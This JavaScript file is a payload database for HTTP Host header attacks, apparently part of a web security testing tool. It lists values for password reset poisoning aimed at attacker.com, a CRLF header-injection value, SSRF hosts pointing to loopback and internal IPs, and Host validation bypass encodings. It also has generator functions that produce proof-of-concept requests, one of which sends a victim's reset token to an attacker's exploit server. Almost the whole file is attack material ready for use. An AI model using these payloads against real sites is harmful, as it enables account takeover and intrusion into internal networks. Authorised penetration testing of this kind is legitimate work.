// HTTP Host Header Attack Payloads
// Comprehensive payload database for Host header vulnerability testing

const HostHeaderPayloads = {
    // Password reset poisoning
    passwordResetPoisoning: [
        { header: 'Host', value: 'attacker.com', description: 'Replace Host with attacker domain' },
        { header: 'Host', value: 'TARGET\nX-Forwarded-Host: attacker.com', description: 'Host with injected header' },
        { header: 'X-Forwarded-Host', value: 'attacker.com', description: 'X-Forwarded-Host injection' },
        { header: 'X-Host', value: 'attacker.com', description: 'X-Host header' },
        { header: 'X-Forwarded-Server', value: 'attacker.com', description: 'X-Forwarded-Server' },
        { header: 'Forwarded', value: 'host=attacker.com', description: 'Forwarded header' }
    ],

    // Host header with port manipulation
    portManipulation: [
        { value: 'TARGET:80', description: 'Standard port' },
        { value: 'TARGET:443', description: 'HTTPS port' },
        { value: 'TARGET:8080', description: 'Alt HTTP port' },
        { value: 'TARGET:@attacker.com', description: 'User info injection' },
        { value: 'TARGET:80@attacker.com', description: 'Port with redirect' },
        { value: 'attacker.com:80', description: 'Replace with attacker' }
    ],

    // Duplicate Host headers
    duplicateHost: [
        { hosts: ['TARGET', 'attacker.com'], description: 'Duplicate Host - first target' },
        { hosts: ['attacker.com', 'TARGET'], description: 'Duplicate Host - first attacker' }
    ],

    // Host header SSRF
    ssrfPayloads: [
        { value: 'localhost', description: 'Localhost access' },
        { value: '127.0.0.1', description: 'Loopback IP' },
        { value: '127.1', description: 'Short loopback' },
        { value: '0.0.0.0', description: 'All interfaces' },
        { value: '192.168.0.1', description: 'Internal network' },
        { value: '10.0.0.1', description: 'Internal 10.x' },
        { value: '172.16.0.1', description: 'Internal 172.x' },
        { value: 'internal-server', description: 'Internal hostname' },
        { value: 'admin.internal', description: 'Admin internal' }
    ],

    // Routing-based SSRF
    routingSSRF: [
        { method: 'GET', path: '/', host: 'localhost', description: 'Route to localhost' },
        { method: 'GET', path: '/admin', host: '192.168.0.1', description: 'Route to internal admin' },
        { method: 'POST', path: '/api', host: 'internal-api', description: 'Route to internal API' }
    ],

    // Absolute URL attacks
    absoluteURL: [
        { url: 'http://attacker.com/', description: 'Absolute URL to attacker' },
        { url: 'http://localhost/', description: 'Absolute URL to localhost' },
        { url: 'http://192.168.0.1/', description: 'Absolute URL to internal' }
    ],

    // Connection state attacks
    connectionState: [
        { description: 'Keep-alive with different Host', technique: 'Send valid request, then smuggle different Host' },
        { description: 'HTTP/1.0 without Host', technique: 'Omit Host header with HTTP/1.0' }
    ],

    // Host validation bypass
    bypassTechniques: [
        { technique: 'Case variation', value: 'ATTACKER.COM' },
        { technique: 'Trailing dot', value: 'attacker.com.' },
        { technique: 'Subdomain prefix', value: 'TARGET.attacker.com' },
        { technique: 'Subdomain suffix', value: 'attacker.TARGET.com' },
        { technique: 'URL encoding', value: 'attacker%2ecom' },
        { technique: 'Double URL encoding', value: 'attacker%252ecom' },
        { technique: 'IPv6', value: '[::1]' },
        { technique: 'IPv6 mapped', value: '[::ffff:127.0.0.1]' }
    ]
};

// Test scenarios
const HostHeaderTests = {
    passwordReset: {
        name: 'Password Reset Poisoning',
        description: 'Inject attacker domain in password reset links',
        severity: 'CRITICAL'
    },
    ssrf: {
        name: 'SSRF via Host Header',
        description: 'Access internal resources via Host manipulation',
        severity: 'HIGH'
    },
    routingSSRF: {
        name: 'Routing-based SSRF',
        description: 'Route requests to internal servers',
        severity: 'CRITICAL'
    },
    authBypass: {
        name: 'Authentication Bypass',
        description: 'Bypass host-based access controls',
        severity: 'CRITICAL'
    },
    cachePoison: {
        name: 'Cache Poisoning via Host',
        description: 'Poison cache with malicious Host',
        severity: 'HIGH'
    }
};

// Helper functions
function getPasswordResetPayloads() {
    return HostHeaderPayloads.passwordResetPoisoning;
}

function getSSRFPayloads() {
    return HostHeaderPayloads.ssrfPayloads;
}

function getBypassTechniques() {
    return HostHeaderPayloads.bypassTechniques;
}

function getPayloadCount() {
    return HostHeaderPayloads.passwordResetPoisoning.length +
        HostHeaderPayloads.portManipulation.length +
        HostHeaderPayloads.ssrfPayloads.length +
        HostHeaderPayloads.routingSSRF.length +
        HostHeaderPayloads.bypassTechniques.length;
}

function generatePasswordResetPoC(targetUrl, attackerUrl) {
    return `# Password Reset Poisoning PoC

# Step 1: Intercept password reset request
POST /forgot-password HTTP/1.1
Host: ${attackerUrl}
Content-Type: application/x-www-form-urlencoded

username=victim

# Step 2: Or use X-Forwarded-Host
POST /forgot-password HTTP/1.1
Host: ${targetUrl}
X-Forwarded-Host: ${attackerUrl}
Content-Type: application/x-www-form-urlencoded

username=victim

# Step 3: Check exploit server for token
# Link will contain: https://${attackerUrl}/reset?token=SECRET`;
}

function generateRoutingSSRFPoC(internalHost) {
    return `# Routing-based SSRF PoC

# Use absolute URL in request line
GET http://${internalHost}/admin HTTP/1.1
Host: vulnerable-site.com

# Or manipulate Host header
GET /admin HTTP/1.1
Host: ${internalHost}

# Try with X-Forwarded-Host
GET /admin HTTP/1.1
Host: vulnerable-site.com
X-Forwarded-Host: ${internalHost}`;
}

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        HostHeaderPayloads,
        HostHeaderTests,
        getPasswordResetPayloads,
        getSSRFPayloads,
        getBypassTechniques,
        getPayloadCount,
        generatePasswordResetPoC,
        generateRoutingSSRFPoC
    };
}
